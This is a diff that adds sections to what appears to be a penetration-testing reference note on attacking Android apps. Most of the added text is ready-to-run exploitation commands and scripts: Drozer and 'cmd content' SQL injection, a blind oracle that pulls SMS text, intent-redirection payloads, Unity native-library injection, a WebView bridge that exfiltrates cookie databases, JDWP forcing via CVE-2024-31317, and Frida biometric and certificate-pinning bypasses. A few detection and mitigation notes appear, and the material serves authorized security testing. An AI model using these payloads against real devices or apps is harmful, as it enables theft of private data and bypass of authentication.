@@ -4,8 +4,8 @@ type: technique
 tags: [android, binary, exploitation, network, reference-import, web]
 phase: exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
-sources: [InternalAllTheThings, msrc-dirty-stream]
+date_updated: 2026-07-14
+sources: [InternalAllTheThings, msrc-dirty-stream, hacktricks-mobile]
 ---
 
 # Android Application
@@ -631,6 +631,379 @@ fastboot flashing unlock
     * For Qualcomm devices, you can use EDL (Emergency Download Mode)
     * For MediaTek devices, BROM (Boot ROM) mode
     * For Unisoc devices, Research Download Mode.
+
+## Enumerating and attacking exported components with Drozer
+
+Drozer runs an agent app on the device and gives you a REPL to introspect and invoke any
+exported Activity, Service, BroadcastReceiver, or ContentProvider without writing a PoC app.
+The exported attack surface is where authorization bypass, IPC abuse, and provider data
+theft live. Install the agent, port-forward its listener (31415), then connect.
+
+```bash
+pip install drozer                       # host client (v3.x is Python 3, WithSecure fork)
+adb install drozer-agent.apk             # on-device agent, press ON
+adb forward tcp:31415 tcp:31415
+drozer console connect
+```
+
+Enumerate and hit the surface:
+
+```bash
+run app.package.list -f <keyword>                 # find package name
+run app.package.attacksurface <pkg>               # counts exported activities/providers/services + debuggable
+run app.package.manifest <pkg>                     # dump manifest
+# Activities: launch to bypass auth gates that assume you enter via the login activity
+run app.activity.info -a <pkg>
+run app.activity.start --component <pkg> <pkg>.SecretActivity
+# Services: send a Message; msg.what/arg1/arg2 map to fields the handleMessage() reads
+run app.service.send <pkg> <pkg>.AuthService --msg 2354 9234 1 --extra string PIN 1337 --bundle-as-obj
+# BroadcastReceivers: fire an action with attacker extras (e.g. confused-deputy SMS send)
+run app.broadcast.send --action org.owasp.goatdroid.SOCIAL_SMS --component <pkg> SendSMSNowReceiver \
+  --extra string phoneNumber 123456789 --extra string message "pwn"
+run app.package.debuggable                          # list debuggable apps
+```
+
+Agentless equivalent for activities from a plain shell: `adb shell am start -n <pkg>/<pkg>.SecretActivity`.
+On API 31+ every component must declare `android:exported`, so grep the merged manifest for
+`exported="true"` as the fast static path.
+
+## Exploiting ContentProviders: SQLi, path traversal, and blind write oracle
+
+Exported providers back onto SQLite DBs or the filesystem. `--projection` and `--selection`
+(WHERE) are concatenated into SQL by many providers, giving injection; file-backed providers
+give path traversal. Modern devices ship `cmd content` so you need no agent.
+
+Drozer discovery and exploitation:
+
+```bash
+run app.provider.info -a <pkg>                       # authorities + read/write perms (note perm omissions)
+run scanner.provider.finduris -a <pkg>               # brute reachable content:// URIs
+run app.provider.query content://<auth>/Passwords/ --vertical
+run scanner.provider.injection -a <pkg>              # auto SQLi in projection/selection
+run scanner.provider.sqltables -a <pkg>              # enumerate tables
+run scanner.provider.traversal -a <pkg>              # auto path traversal
+run app.provider.read content://<auth>/../../../../etc/hosts
+# manual SQLi via projection to read schema:
+run app.provider.query content://<auth>/Passwords/ --projection "* FROM sqlite_master;--"
+```
+
+Agentless with `cmd content` (ADB >= 8.0):
+
+```bash
+adb shell cmd content query  --uri content://<auth>/items/
+adb shell cmd content update --uri content://<auth>/items/1 --bind price:d:1337
+adb shell cmd content call   --uri content://<auth> --method <m> --arg foo
+```
+
+Blind SQLi via `update()` when writePermission is omitted (a common OEM bug): if a provider
+sets readPermission but not writePermission and its `update()` concatenates the caller WHERE,
+you get a Boolean oracle. `update()` returns rows-affected (or throws a UNIQUE-constraint error)
+which is TRUE, letting you exfiltrate co-located privileged tables (for example `sms`) one char
+at a time. Seed a row with `insert` first if the target table is empty.
+
+```bash
+# TRUE if first char of latest SMS body is a digit (48..57)
+adb shell cmd content update --uri content://<auth>/x --bind rowid:s:123 \
+  --where '1=1 AND unicode(substr((SELECT body FROM sms ORDER BY rowid DESC LIMIT 1),1,1)) BETWEEN 48 AND 57'
+```
+
+Recent real bugs: CVE-2024-43089 (MediaProvider `openFile()` traversal, arbitrary read of any
+app private storage), CVE-2025-10184 (OnePlus telephony provider permission bypass).
+
+## Intent injection, redirection (CWE-926) and hijacking
+
+Three distinct classes. (1) Deep-link to sink: an exported VIEW+BROWSABLE activity forwards a
+URL query param into a WebView or other sink. (2) Intent redirection: an exported proxy reads
+an attacker Intent from an extra (`redirect_intent`, `next_intent`) or `Intent.parseUri()` and
+`startActivity()`s it under the victim UID, reaching non-exported components or granting
+`content://` URI permissions to the attacker (confused deputy). (3) Intent hijacking: attacker
+registers an intent-filter matching an implicit Intent the victim sends (OAuth callback, camera
+result) and steals the tokens in it.
+
+```bash
+# Deep link forced into internal WebView
+adb shell am start -a android.intent.action.VIEW \
+  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
+
+# Redirection: proxy forwards an attacker Intent to a privileged internal activity
+adb shell am start -n com.target/.ProxyActivity \
+  --es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
+
+# Redirection that preserves URI-grant flags (0x43 = READ|WRITE|PERSISTABLE grant)
+adb shell am start -n com.victim/.SdkProxyActivity \
+  --es payload '{"n_intent_uri":"intent:#Intent;action=android.intent.action.VIEW;data=content://com.victim.fileprovider/root/secret.xml;launchFlags=0x43;end"}'
+```
+
+Hunting: grep decompiled code for `getParcelableExtra("redirect_intent")`, `Intent.parseUri(..., URI_ALLOW_UNSAFE)`,
+and `startActivity`/`sendBroadcast` on attacker-influenced Intents with no `getCallingPackage()`
+check. Automate extra/type discovery from Smali with APK Components Inspector (emits ready-to-run
+`am`/`cmd content` lines). Type-aware `am` flags: `--es` string, `--ei` int, `--ez` bool,
+`--el` long, `--ef` float, `--eu` URI, `--ecn` component. Runtime capture/replay of live Intents
+inside `system_server` with IRIS (Frida). Real CVEs: CVE-2024-26131 (Element), CVE-2022-36837
+(Samsung Email), CVE-2020-14116 (Mi Browser).
+
+## Unity runtime intent-to-CLI pre-init native library injection (CVE-2025-59489)
+
+Unity Android apps use `com.unity3d.player.UnityPlayerActivity` (exported by default in many
+templates) and treat a string extra named `unity` as Unity command-line flags. The undocumented
+flag `-xrsdk-pre-init-library <abs-path>` causes `dlopen(path, RTLD_NOW)` very early in init,
+loading an attacker ELF into the victim process with its UID and permissions (camera, mic,
+storage, in-app session). Any local app can trigger it; if the activity also has BROWSABLE, a
+website can via an `intent:` URL.
+
+```bash
+# Local: point at a payload ELF readable by the victim (attacker app native lib dir, or the
+# victim's own private cache which satisfies the linker permitted_paths under /data)
+adb shell am start -n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
+  -e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER==/lib/arm64/libpayload.so"
+```
+
+The file need not end in `.so` (dlopen checks ELF headers). SELinux/linker namespaces block
+`/sdcard` paths, so the reliable path is an absolute location under the victim app private
+storage (cache-to-ELF). Patched in Unity Sept-2025 advisory.
+
+## Android WebView attacks: JS bridge, native file read, order-of-checks
+
+Once you control content in an app WebView (via a deep-link `url=` sink, `loadData()` XSS from
+an exported Intent extra, or a permissive host allowlist), the prizes are the JavaScript bridge
+and native file sinks. `addJavascriptInterface` exposes `@JavascriptInterface` methods to the
+page; a dispatcher-style bridge (`invokeMethod(json)`) that routes on a `handlerName` often has
+a handler that reads a `file://`/`uri` param via `new File(...)` in native code, bypassing
+`setAllowFileAccess(false)`.
+
+```bash
+# XSS via exported activity that pushes an Intent extra into loadData()
+adb shell am start -n com.victim/.ExportedWebViewActivity --es data '<img src=x onerror="alert(1)">'
+```
+
+```javascript
+// enumerate exposed bridge objects from the page
+for (let k in window) { try { if (typeof window[k]==='object'||typeof window[k]==='function') console.log('[JSI]',k);} catch(e){} }
+
+// arbitrary file read -> Base64 exfil of the WebView cookie DB (session hijack)
+xbridge.invokeMethod(JSON.stringify({
+  handlerName:'toBase64', callbackId:'cb_'+Date.now(),
+  data:{ uri:'file:///data/data/<pkg>/app_webview/Default/Cookies' }
+}));
+```
+
+Flawed host checks to watch for: `host.endsWith(".trusted.com") || ".trusted.com".endsWith(host)`
+(the second clause admits unintended hosts) and `setJavaScriptEnabled(true)` executed before the
+final URL allowlist check. Enable remote debugging for enumeration:
+`WebView.setWebContentsDebuggingEnabled(true)` then chrome://inspect (force it on release builds
+with LSPosed/Frida). Exfil primitive: `XMLHttpRequest` to `file:///data/data/<pkg>/databases/*.db`.
+
+## Task hijacking (StrandHogg) via taskAffinity
+
+Every activity inherits `taskAffinity` equal to the app package unless the dev sets
+`android:taskAffinity=""`. A malicious app declaring an activity with the victim package as its
+affinity can get merged into the victim back-stack; when the user later opens the real app,
+Android surfaces the attacker activity first, ideal for phishing and permission-grant abuse.
+Works on standard launch mode too (the app hides itself with `moveTaskToBack(true)`). Mitigated
+by default on Android 11+ (tasks not shared across UIDs); older versions vulnerable.
+
+```xml
+<activity android:name=".EvilActivity" android:exported="true"
+          android:taskAffinity="com.victim.package" android:launchMode="singleTask">
+  <intent-filter><action android:name="android.intent.action.MAIN"/>
+    <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
+</activity>
+```
+
+Detection:
+
+```bash
+apkanalyzer manifest print app.apk | grep -i taskaffinity        # empty/custom affinity = safe
+adb shell dumpsys activity activities | grep -E "Root|affinity"  # top activity pkg != task affinity = red flag
+```
+
+StrandHogg 2.0 (CVE-2020-0096) is the reflection-based variant that re-parents into any task at
+runtime without taskAffinity (patched May 2020 SPL on Android 8-9; 10+ unaffected). Often chained
+with tapjacking / TapTrap. Fix: `android:taskAffinity=""` at the application level.
+
+## Tapjacking and accessibility overlay phishing
+
+Tapjacking overlays a transparent window over the victim so taps land on the victim UI without
+the user knowing (permission grants, purchases). Android 12+ drops touches from another UID's
+`TYPE_APPLICATION_OVERLAY` window when opacity >= 0.8, so attackers keep `alpha < 0.8` or use
+fully transparent animation-driven overlays (TapTrap). Modern banking trojans (ToxicPanda, Hook,
+Anatsa) escalate to an Accessibility overlay: a WebView added with `TYPE_ACCESSIBILITY_OVERLAY`
+and `FLAG_NOT_TOUCH_MODAL` renders a phishing form while forwarding real touches to the app
+underneath, bypassing the SYSTEM_ALERT_WINDOW prompt entirely.
+
+```bash
+# toggle Android 12+ block for PoC crafting
+adb shell am compat disable BLOCK_UNTRUSTED_TOUCHES com.example.victim
+adb logcat | grep -i "Untrusted touch"          # system logs occluded taps
+# audit for apps holding accessibility bind
+adb shell pm list packages -3
+```
+
+Defence signals to check for in the target: `android:filterTouchesWhenObscured="true"` /
+`setFilterTouchesWhenObscured(true)`, `onFilterTouchEventForSecurity` rejecting
+`FLAG_WINDOW_IS_PARTIALLY_OBSCURED`, `FLAG_SECURE`, and (Android 14+)
+`android:accessibilityDataSensitive="accessibilityDataPrivateYes"` on sensitive views.
+
+## Smali patching: decompile, modify, recompile, sign
+
+Repacking is how you strip anti-tamper, root/pinning checks, or flip a paywall boolean when
+runtime hooks are inconvenient. Full modern flow with `apktool` + `zipalign` + `apksigner`
+(preferred over jarsigner for v2/v3 signatures):
+
+```bash
+apktool d app.apk                                   # -> smali/ + resources
+# edit smali, then:
+apktool b . -o dist/app-unsigned.apk
+keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias k
+zipalign -P 16 -f -v 4 dist/app-unsigned.apk dist/app-aligned.apk   # -P 16 for 16KiB page devices
+apksigner sign --ks key.jks --out dist/app-signed.apk dist/app-aligned.apk
+apksigner verify --verbose --print-certs dist/app-signed.apk
+```
+
+Split APKs (`base.apk` + `split_config.*`) must be joined first (apk.sh) or the install fails.
+Smali gotchas that break rebuilds: bump `.locals` (not `.registers`, which remaps params);
+`move-result*` must immediately follow its `invoke-*`; wide (long/double) values occupy a
+register pair; use `/range` variants for many/high registers.
+
+Patching anti-tamper: search JADX for `GET_SIGNING_CERTIFICATES`, `apkContentsSigners`,
+`MessageDigest`, `getInstallerPackageName`, `com.android.vending`. Patch the final boolean or
+invert the branch rather than rewriting the routine:
+
+```smali
+const/4 v0, 0x1              # force "valid"
+if-nez v0, :tamper_detected  # inverted from if-eqz
+```
+
+Fast path: VS Code + APKLab extension, or apk.sh, automate decompile/patch/recompile/sign.
+
+## Exploiting a debuggable application (JDWP) and forcing debuggable (CVE-2024-31317)
+
+If the manifest has `android:debuggable="true"` (or you patch it in), attach a Java debugger via
+JDWP to set breakpoints, read/patch locals, and flip return values at runtime with no source
+edit, effectively bypassing root/debug checks from inside the debugger.
+
+```bash
+adb shell am setup-debug-app -w <pkg>            # make it wait for debugger (re-run each launch)
+adb shell monkey -p <pkg> 1                       # start it
+adb jdwp                                           # find the Dalvik VM PID
+adb forward tcp:8700 jdwp:<pid>
+jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
+# jdb: classes / methods <cls> / stop at <cls>.onClick / locals / set var = val / run
+```
+
+CVE-2024-31317 forces ANY app debuggable without repacking: an `adb`/`WRITE_SECURE_SETTINGS`
+holder smuggles a Zygote `--runtime-flags=0x104` (DEBUG_ENABLE_JDWP|DEBUG_JNI_DEBUGGABLE) through
+the hidden-API denylist setting; the victim forks with a JDWP thread. Android 9-14 before the
+2024-06 patch.
+
+```bash
+adb shell settings put global hidden_api_blacklist_exemptions "--runtime-flags=0x104|Lcom/example/Fake;->x:"
+adb shell monkey -p com.victim.bank 1
+adb jdwp && adb forward tcp:8700 jdwp:<pid>
+```
+
+Grants full read/write to any app private dir (token theft, MDM bypass). Mitigate: patch level
+2024-06+, restrict shell/WRITE_SECURE_SETTINGS on production.
+
+## Bypassing Android biometric authentication (BiometricPrompt)
+
+The frequent flaw is treating `onAuthenticationSucceeded()` as a UI gate rather than using the
+returned `CryptoObject` to unlock a Keystore key. When there is no crypto binding, a Frida hook
+that invokes the success callback with a null CryptoObject bypasses the whole prompt (the system
+dialog never appears). Works through API 34 if the app does not validate the cipher/signature.
+
+```bash
+# WithSecure fingerprint-bypass.js (no CryptoObject) or universal biometric bypass
+frida -U -f com.target.app --no-pause -l fingerprint-bypass.js
+frida -U -f com.target.app --no-pause -l universal-android-biometric-bypass.js
+```
+
+```javascript
+// downgrade a strong-only policy to weak/device-credential so the PIN fallback is accepted
+var B = Java.use('androidx.biometric.BiometricPrompt$PromptInfo$Builder');
+B.setAllowedAuthenticators.implementation = function(f){ return this.setAllowedAuthenticators(0x0002|0x8000); };
+```
+
+Secure pattern (what to verify in the target): key generated with
+`setUserAuthenticationRequired(true)` and `setInvalidatedByBiometricEnrollment(true)`, the
+returned `CryptoObject` cipher used to decrypt real data, and `BIOMETRIC_STRONG` only. Vendor
+CVEs (CVE-2023-20995, CVE-2024-53835) target the sensor pipeline itself.
+
+## Advanced anti-instrumentation and modern SSL pinning bypass
+
+When drop-in unpinning scripts hang and apps detect Frida/root at init, layer these tactics.
+Root/Zygisk hiding first: Magisk Zygisk + DenyList (add the package, reboot) neutralizes naive
+`su`/getprop checks; add Shamiko/LSPosed for stronger hiding. Beat init-time detectors by
+attaching after the UI loads instead of spawn-mode:
+
+```bash
+frida -U -n com.example.app                       # attach late, past onCreate() checks
+frida -U -f com.example.app -l anti-frida-detection.js
+frida-trace -n com.example.app -i "JNI_OnLoad"    # follow the native trail
+```
+
+Stealth Frida server (phantom-frida) renames ~90 fingerprints (process/thread names, memfd
+label, SELinux labels, exported `frida_agent_main`, D-Bus names, port). Automate with Medusa
+(90+ modules: `use http_communications/multiple_unpinner`).
+
+Modern pinning lives in OkHttp4+, Cronet/gRPC over BoringSSL, so hook beyond the basic
+SSLContext:
+
+```javascript
+// OkHttp4 CertificatePinner + Cronet builder
+Java.use('okhttp3.CertificatePinner').check.overload('java.lang.String','java.util.List').implementation=function(){};
+// native BoringSSL fallback when TLS still fails
+const cv = Module.findExportByName(null,'SSL_CTX_set_custom_verify');
+if (cv) Interceptor.attach(cv,{ onEnter(a){ a[1]=ptr(0); a[2]=NULL; }});  // SSL_VERIFY_NONE
+// native anti-debug: neuter ptrace
+const p = Module.findExportByName(null,'ptrace');
+if (p) Interceptor.replace(p, new NativeCallback(()=>-1,'int',['int','int','pointer','pointer']));
+```
+
+Static fallback (no instrumentation): `apk-mitm app.apk` strips pinning and rewrites the network
+security config, then proxy. Force proxy + unpin universally with HTTP Toolkit's
+frida-interception-and-unpinning hooks. LSPosed can also hook telephony/SMS APIs
+(`getLine1Number`, `sendTextMessage`) to defeat SIM-binding flows on rooted devices.
+
+## Play Integrity (SafetyNet successor) attestation bypass
+
+Play Integrity returns a Google-signed JWT with `appIntegrity`/`deviceIntegrity`/`accountDetails`
+verdicts (`MEETS_BASIC/DEVICE/STRONG_INTEGRITY`). You cannot forge the JWT, so you spoof the
+signals Google evaluates: hide root, swap the hardware key attestation chain (`keybox.xml`) for a
+genuine certified/locked-device one, and spoof the security patch level for STRONG.
+
+Toolchain (Magisk modules): ReZygisk/ZygiskNext (root hide) + TrickyStore + Tricky Addon (keybox
+injection, patch-date spoof) + PlayIntegrityFork (prop spoof for the DroidGuard path, mostly
+helps Android <13). Validate with the Play Integrity API Checker and Key Attestation APKs. In
+TrickyStore: select all, inject a Valid keybox for BASIC+DEVICE, then Set Security Patch for
+STRONG. Google revokes abused keyboxes, so rotate when blocked; RKA (relay attestation to a
+remote rooted device) avoids burning a keybox per device.
+
+Tester angle against weak backend integrations (more durable than recovering STRONG): check for
+missing action binding (`standard` should bind `requestHash`, `classic` a high-entropy nonce),
+weak `timestampMillis` freshness (replay windows), over-trusting spoofable `requestPackageName`,
+and treating pre-13 STRONG as equivalent to 13+ STRONG.
+
+## Manual and LLM-assisted de-obfuscation
+
+Recognize obfuscation (scrambled strings, binaries in assets + `DexClassLoader` unpacking,
+unnamed JNI functions), then either replicate the decrypt routine or observe it at runtime.
+For string encryption, the goal is to execute the algorithm, not fully understand it: lift the
+decrypt method into a standalone Java/Python harness, or hook it with Frida and log inputs and
+plaintext at the moment of decryption. Packers/DexClassLoader payloads are best recovered
+dynamically by dumping the loaded DEX after unpack.
+
+LLM-assisted (Androidmeda) automates the tedious renaming/control-flow-recovery over jadx output:
+
+```bash
+jadx -d input_dir/ target.apk                # decompile, trim to app packages
+python3 androidmeda.py --llm_provider ollama --llm_model llama3.2 \
+  --source_dir input_dir/ --output_dir out/ --save_code true   # offline, no data egress
+```
+
+It renames ProGuard/DexGuard identifiers to semantic names, unflattens control flow, decrypts
+common string schemes, and writes a `vuln_report.json`. Use the offline ollama backend when the
+app is sensitive.
 
 ## References
 
